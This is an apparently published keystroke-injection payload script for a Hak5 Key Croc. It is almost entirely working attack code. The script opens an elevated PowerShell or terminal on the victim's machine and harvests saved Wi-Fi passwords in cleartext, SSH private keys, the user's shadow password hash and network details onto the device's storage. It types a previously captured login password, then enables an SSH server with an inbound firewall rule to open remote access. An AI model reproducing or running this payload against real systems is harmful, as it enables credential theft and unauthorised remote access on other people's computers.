# Title:         Croc_Pot Payload
# Description:   Start Croc_pot.sh bash script automatically, scan takes about 30-40 sec to start because of OS detection
#                This will collect some data off target (ip address, current user name, target host name, ssid and passwd, mac address)
#                save to tools/Croc_pot folder
# Author:        Spywill
# Version:       1.4.3
# Category:      Key Croc

MATCH crocpot

#---> Edit KEYCROC_PASSWD_HERE
CROC_PW=hak5croc

#---> Check for target saved passwd, run Croc_Unlock payload first if not edit below
if [ -f "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
	TARGET_PW=$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
else
	TARGET_PW=LINUX_PASSWD_HERE
fi

#---> Save keycroc passwd in temp folder, used for starting Reverse SSH Tunnel with Target
echo "$CROC_PW" > /tmp/CPW.txt

#---> Create Croc_Pot directories
CROC_POT_DIR=(/root/udisk/tools/Croc_Pot /root/udisk/loot/Croc_Pot)
for dir in "${CROC_POT_DIR[@]}"; do [[ ! -d "$dir" ]] && mkdir "$dir" || LED B; done

#---> remove existing OS detection
rm ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt
rm ${CROC_POT_DIR[0]}/NumLock.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt

#---> Enter ethernet mode for OS detection
ATTACKMODE AUTO_ETHERNET
LED ATTACK

#---> Keycroc built in functions, retrieve target Loot and save to tools/Croc_Pot/Croc_OS.txt
GET TARGET_OS && echo "$TARGET_OS" > "${CROC_POT_DIR[0]}/Croc_OS.txt"
GET TARGET_IP && echo "$TARGET_IP" >> "${CROC_POT_DIR[0]}/Croc_OS.txt"
GET TARGET_HOSTNAME && echo "$TARGET_HOSTNAME" >> "${CROC_POT_DIR[0]}/Croc_OS.txt"

#---> Enter Storage mode on keycroc
ATTACKMODE HID STORAGE
Q DELAY 3000

#---> After OS detection case TARGET_OS value
case $TARGET_OS in
WINDOWS)
	LED C
	#---> Start windows powershell with administrator privileges
	Q GUI m
	Q GUI r ; Q DELAY 2000
	Q STRING "powershell Start-Process powershell -Verb runAs"
	Q ENTER ; Q DELAY 5000
	Q ALT y ; Q DELAY 5000
	#---> Check numlock state on or off
	Q STRING "\$wsh = New-Object -ComObject WScript.Shell ; if ([console]::NumberLock -eq \$false) { \$wsh.SendKeys('{NUMLOCK}') ; echo \"NUMLOCK TRUN ON\" } else { echo \"NUMLOCK ON\" }"
	Q ENTER ; Q DELAY 2000
	#---> Place keycroc usb drive into variable
	Q STRING "\$MOUNT_POINT = (Get-WmiObject -Class win32_volume -Filter 'label=\"KeyCroc\"').DriveLetter"
	Q ENTER ; Q DELAY 2000
	#---> Save numlock state to tools/Croc_Pot/Numlock.txt
	Q STRING "[console]::NumberLock | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\NumLock.txt\" -noclobber -append"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve target user name & save to tools/Croc_Pot/Croc_OS_Target.txt
	Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve target IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
	Q STRING "Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=\$true | Select-Object -ExpandProperty IPAddress | Format-Table -AutoSize | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve target SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
	Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve target MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
	Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
	Q ENTER ; Q DELAY 3000
	#---> Ping network to look for Shark Jack
	Q STRING "ping -n 1 shark.lan | select-string -pattern 'Reply'"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve Shark Jack IP if connected to local network as target & save to tools/Croc_Pot/shark_ip.txt
	Q STRING "[System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
	Q ENTER ; Q DELAY 3000
	#---> Place Shark Jack IP into variable
	Q STRING "\$jack_mac = [System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve Shark Jack MAC address if connected to local network as target & save to tools/Croc_Pot/shark_ip.txt
	Q STRING "arp -a \$jack_mac | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve packet squirrel MAC address if connected to local network as target & save to tools/Croc_Pot/squirrel_mac.txt
	Q STRING "arp -a 172.16.32.1 | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\squirrel_mac.txt\""
	Q ENTER ; Q DELAY 2000
	#---> Ping network to look for Lan turtle
	Q STRING "ping -n 1 turtle.lan | select-string -pattern 'Reply'"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve Lan turtle IP if connected to local network as target & save to tools/Croc_Pot/turtle_mac.txt
	Q STRING "[System.Net.Dns]::GetHostAddresses(\"turtle.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\turtle_mac.txt\""
	Q ENTER ; Q DELAY 2000
	#---> Place Lan turtle IP into variable
	Q STRING "\$turtle_mac = [System.Net.Dns]::GetHostAddresses(\"turtle.lan\")[0].IPAddressToString"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve Lan turtle MAC address if connected to local network as target & save to tools/Croc_Pot/turtle_mac.txt
	Q STRING "arp -a \$turtle_mac | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\turtle_mac.txt\" -noclobber -append"
	Q ENTER ; Q DELAY 2000
	#---> Retrieve Bash Bunny MAC address if connected to local network as target ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
	Q STRING "arp -a 172.16.64.1 | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\bunny_mac.txt\""
	Q ENTER ; Q DELAY 2000
	#---> Retrieve target .ssh file save to /loot/Croc_Pot/SSH
	Q STRING "if ( (Test-Path -path ~/.ssh) -eq \$True ) { Copy-Item -Path ~/.ssh\* -Destination \"\$MOUNT_POINT\loot\Croc_Pot\SSH\" } else {\$false}"
	Q ENTER
	#---> sed to remove powershell output first "?" character, "\r" endlines, replace "-" with ":"
	sed -i '0,/./s/^.//' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt
	sed -i 's/\r//g' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt
	sed -i 's/-/:/g' ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt
;;
MACOS)
	LED G ; Q DELAY 1000
	#---> Start mac os terminal
	Q GUI-SPACE ; Q DELAY 1000
	Q STRING "terminal"
	Q ENTER
;;
LINUX)
	LED B
	#---> After TARGET_HOSTNAME scan case TARGET_HOSTNAME value
	case $TARGET_HOSTNAME in
	raspberrypi)
		#---> Start Raspberry pi 4 LXTerminal
		Q CONTROL-ALT-d
		Q CONTROL-ALT-t
		Q DELAY 2000
		#---> Place keycroc usb drive into variable
		Q STRING "MOUNT_POINT=/media/\$(whoami)/KeyCroc/tools/Croc_Pot"
		Q ENTER ; Q DELAY 2000
		Q STRING "MOUNT_LOOT=/media/\$(whoami)/KeyCroc/loot/Croc_Pot"
		Q ENTER ; Q DELAY 2000
		#---> Check numlock state on or off
		Q STRING "xset -q | grep -Po '(?<=Num Lock:)\W*\K[^ ]*' | tee \$MOUNT_POINT/NumLock.txt"
		Q ENTER ; Q DELAY 2000
		if [ "$(sed -n 1p ${CROC_POT_DIR[0]}/NumLock.txt)" = off ]; then
			Q NUMLOCK
		fi
		#---> Retrieve target user name & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "whoami | tee \$MOUNT_POINT/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "ifconfig -a | awk -v wifi=\"\$(ip -o link show | awk '/wlan/{print \$2}' | cut -d':' -f1 | head -n1)\" '/^[^\t]/{if (ip) print ip; ip=\"\"} \$1 == \"inet\" && \$2 != \"127.0.0.1\"{ip=\$2} \$1 == wifi{print ip; ip=\"\"} END{if (ip) print ip}' | tac | tee -a \$MOUNT_POINT/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "sudo sed -n '/ssid\|psk/,+1p' /etc/wpa_supplicant/wpa_supplicant.conf | sed -e 's/[\"]//g' | tee -a \$MOUNT_POINT/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \$MOUNT_POINT/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Shark Jack IP if connected to local network as target & save to tools/Croc_Pot/shark_ip.txt
		Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee \$MOUNT_POINT/shark_ip.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Shark Jack MAC address if connected to local network as target & save to tools/Croc_Pot/shark_ip.txt
		Q STRING "arp shark.lan | awk '/'shark.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee -a \$MOUNT_POINT/shark_ip.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve packet squirrel MAC address if connected to local network as target & save to tools/Croc_Pot/squirrel_mac.txt
		Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee \$MOUNT_POINT/squirrel_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Lan turtle IP if connected to local network as target & save to tools/Croc_Pot/turtle_mac.txt
		Q STRING "ping -c1 -w1 turtle | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee \$MOUNT_POINT/turtle_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Lan turtle MAC address if connected to local network as target & save to tools/Croc_Pot/turtle_mac.txt
		Q STRING "arp turtle | awk '/'turtle'/{print \$3}' | sed -e 's/HWaddress//g' | tee -a \$MOUNT_POINT/turtle_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Bash Bunny MAC address if connected to local network as target ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
		Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee \$MOUNT_POINT/bunny_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target .ssh file save to /loot/Croc_Pot/SSH
		Q STRING "sudo cp -fr ~/.ssh/. \$MOUNT_LOOT/SSH/"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target hash passwd save to /loot/Croc_Pot/target_hash_passwd.txt
		Q STRING "sudo getent shadow \$(whoami) | tee \$MOUNT_LOOT/target_hash_passwd"
		Q ENTER ; Q DELAY 2000
		#---> Unmount keycroc usb drive
		Q STRING "sudo umount /media/\$(whoami)/KeyCroc"
		Q ENTER
	;;
	"$TARGET_HOSTNAME")
		#---> Start mate-terminal Parrot OS
		Q CONTROL-ALT-d
		Q ALT-t
		Q DELAY 2000
		#---> Check numlock state on or off
		Q STRING "if [ \$(xset -q | grep -Po '(?<=Num Lock:)\W*\K[^ ]*') == \"off\" ]; then echo -ne \"\n\nNUMLOCK STATE: OFF Payload may fail trun NUMLOCK ON\n\n\" ; else echo -ne \"\n\nNUMLOCK STATE: ON\n\n\"; fi" ; Q ENTER
		Q ENTER ; Q DELAY 3000
		#---> Create keycroc directory, Mount keycroc usb drive to target
		Q STRING "MOUNT_POINT=\"/mnt/usb\" ; sudo mkdir -p \$MOUNT_POINT ; sudo mount -L \"KeyCroc\" \$MOUNT_POINT"
		Q ENTER ; Q DELAY 2000
		#---> Entering Linux passwd
		Q STRING "$TARGET_PW"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target user name & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "whoami | sudo tee \$MOUNT_POINT/tools/Croc_Pot/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "ifconfig -a | awk -v wifi=\"\$(ip -o link show | awk '/wlan/{print \$2}' | cut -d':' -f1 | head -n1)\" '/^[^\t]/{if (ip) print ip; ip=\"\"} \$1 == \"inet\" && \$2 != \"127.0.0.1\"{ip=\$2} \$1 == wifi{print ip; ip=\"\"} END{if (ip) print ip}' | tac | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Shark Jack IP if connected to local network as target & save to tools/Croc_Pot/shark_ip.txt
		Q STRING "sudo ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | sudo tee \$MOUNT_POINT/tools/Croc_Pot/shark_ip.txt"
		Q ENTER ; Q DELAY 5000
		#---> Retrieve Shark Jack MAC address if connected to local network as target & save to tools/Croc_Pot/shark_ip.txt
		Q STRING "arp shark.lan | awk '/'shark.lan'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/shark_ip.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve packet squirrel MAC address if connected to local network as target & save to tools/Croc_Pot/squirrel_mac.txt
		Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee \$MOUNT_POINT/tools/Croc_Pot/squirrel_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Lan turtle IP if connected to local network as target & save to tools/Croc_Pot/turtle_mac.txt
		Q STRING "sudo ping -c1 -w1 turtle | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | sudo tee \$MOUNT_POINT/tools/Croc_Pot/turtle_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Lan turtle MAC address if connected to local network as target & save to tools/Croc_Pot/turtle_mac.txt
		Q STRING "arp turtle | awk '/'turtle'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/turtle_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Bash Bunny MAC address if connected to local network as target ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
		Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee \$MOUNT_POINT/tools/Croc_Pot/bunny_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target .ssh file save to /loot/Croc_Pot/SSH
		Q STRING "sudo cp -fr ~/.ssh/. \$MOUNT_POINT/loot/Croc_Pot/SSH/"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target hash passwd save to /loot/Croc_Pot/target_hash_passwd.txt
		Q STRING "sudo getent shadow \$(whoami) | sudo tee \$MOUNT_POINT/loot/Croc_Pot/target_hash_passwd"
		Q ENTER ; Q DELAY 2000
		#---> Unmount keycroc usb drive
		Q STRING "sudo umount \$MOUNT_POINT"
		Q ENTER
	;;
	*)
		#---> Start linux distributions terminal xterm 
		#---> Unsure of which linux distribution this will work on
		Q ALT F2
		Q DELAY 2000
		Q STRING "xterm"
		Q ENTER ; Q DELAY 2000
		#---> Check numlock state on or off
		Q STRING "if [ \$(xset -q | grep -Po '(?<=Num Lock:)\W*\K[^ ]*') == \"off\" ]; then echo -ne \"\n\nNUMLOCK STATE: OFF Payload may fail trun NUMLOCK ON\n\n\" ; else echo -ne \"\n\nNUMLOCK STATE: ON\n\n\"; fi" ; Q ENTER
		Q ENTER ; Q DELAY 2000
		#---> Create keycroc directory, Mount keycroc usb drive to target
		Q STRING "MOUNT_POINT=\"/mnt/usb\" ; sudo mkdir -p \$MOUNT_POINT ; sudo mount -L \"KeyCroc\" \$MOUNT_POINT"
		Q ENTER ; Q DELAY 2000
		#---> Entering Linux passwd
		Q STRING "$TARGET_PW"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target user name & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "whoami | sudo tee \$MOUNT_POINT/tools/Croc_Pot/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "ifconfig -a | awk -v wifi=\"\$(ip -o link show | awk '/wlan/{print \$2}' | cut -d':' -f1 | head -n1)\" '/^[^\t]/{if (ip) print ip; ip=\"\"} \$1 == \"inet\" && \$2 != \"127.0.0.1\"{ip=\$2} \$1 == wifi{print ip; ip=\"\"} END{if (ip) print ip}' | tac | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
		Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/Croc_OS_Target.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Shark Jack IP if connected to local network as target & save to tools/Croc_Pot/shark_ip.txt
		Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | sudo tee \$MOUNT_POINT/tools/Croc_Pot/shark_ip.txt"
		Q ENTER ; Q DELAY 5000
		#---> Retrieve Shark Jack MAC address if connected to local network as target & save to tools/Croc_Pot/shark_ip.txt
		Q STRING "arp shark.lan | awk '/'shark.lan'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/shark_ip.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve packet squirrel MAC address if connected to local network as target & save to tools/Croc_Pot/squirrel_mac.txt
		Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee \$MOUNT_POINT/tools/Croc_Pot/squirrel_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Lan turtle IP if connected to local network as target & save to tools/Croc_Pot/turtle_mac.txt
		Q STRING "ping -c1 -w1 turtle | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | sudo tee \$MOUNT_POINT/tools/Croc_Pot/turtle_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Lan turtle MAC address if connected to local network as target & save to tools/Croc_Pot/turtle_mac.txt
		Q STRING "arp turtle | awk '/'turtle'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee -a \$MOUNT_POINT/tools/Croc_Pot/turtle_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve Bash Bunny MAC address if connected to local network as target ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
		Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee \$MOUNT_POINT/tools/Croc_Pot/bunny_mac.txt"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target .ssh file save to /loot/Croc_Pot/SSH
		Q STRING "sudo cp -fr ~/.ssh/. \$MOUNT_POINT/loot/Croc_Pot/SSH/"
		Q ENTER ; Q DELAY 2000
		#---> Retrieve target hash passwd save to /loot/Croc_Pot/target_hash_passwd.txt
		Q STRING "sudo getent shadow \$(whoami) | sudo tee \$MOUNT_POINT/loot/Croc_Pot/target_hash_passwd"
		Q ENTER ; Q DELAY 2000
		#---> Unmount keycroc usb drive
		Q STRING "sudo umount \$MOUNT_POINT"
		Q ENTER
	;;
	esac
;;
esac

#---> Return back to ATTACKMODE HID mode
Q DELAY 3000
ATTACKMODE HID
Q DELAY 3000

#----> Check with nmap status of SSH on target
#----> Make sure that Windows Defender Firewall allows inbound connections to Windows through TCP port 22:
NMAP_SSH="$(nmap "$(sed -n 2p ${CROC_POT_DIR[0]}/Croc_OS_Target.txt)" -PN -p ssh | grep -E -o 'open|closed|filtered')"
if [ "$TARGET_OS" = "WINDOWS" ]; then
	if [ "$NMAP_SSH" = "open" ]; then
		Q STRING "Get-Service sshd"
		Q ENTER ; Q DELAY 2000
	elif [ "$NMAP_SSH" = "closed" ] || [ "$NMAP_SSH" = "filtered" ]; then
		Q STRING "Set-Service -Name sshd -StartupType 'Automatic' ; Start-Service sshd"
		Q ENTER ; Q DELAY 2000
		Q STRING "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"
		Q ENTER ; Q DELAY 2000 
		Q STRING "restart-service sshd"
		Q ENTER ; Q DELAY 2000
		Q STRING "Get-Service sshd ; Get-NetFirewallRule -Name *OpenSSH-Server* | select Name, DisplayName, Description, Enabled"
		Q ENTER ; Q DELAY 6000
	else
		Q STRING "Get-Service sshd ; Get-NetFirewallRule -Name *OpenSSH-Server* | select Name, DisplayName, Description, Enabled"
		Q ENTER ; Q DELAY 6000
	fi
elif [ "$TARGET_OS" = "LINUX" ]; then
	if [ "$NMAP_SSH" = "open" ]; then
		Q STRING "sudo systemctl status sshd"
		Q ENTER ; Q DELAY 3000 ; Q STRING "q"
	elif [ "$NMAP_SSH" = "closed" ] || [ "$NMAP_SSH" = "filtered" ]; then
		Q STRING "sudo systemctl start ssh"
		Q ENTER ; Q DELAY 3000 ; Q STRING "q"
		Q STRING "sudo systemctl status sshd"
		Q ENTER ; Q DELAY 3000 ; Q STRING "q"
	else
		Q STRING "sudo systemctl status sshd"
		Q ENTER ; Q DELAY 3000 ; Q STRING "q"
		Q STRING "sudo iptables -L"
		Q ENTER ; Q DELAY 3000
	fi
else
	Q DELAY 1000
fi
Q ENTER

#---> Start SSH session with target
Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
Q ENTER ; Q DELAY 2000
#---> Entering keycroc passwd
Q STRING "$CROC_PW"
Q ENTER ; Q DELAY 2000
#---> Starting Croc_Pot
Q STRING "${CROC_POT_DIR[0]}.sh"
Q ENTER
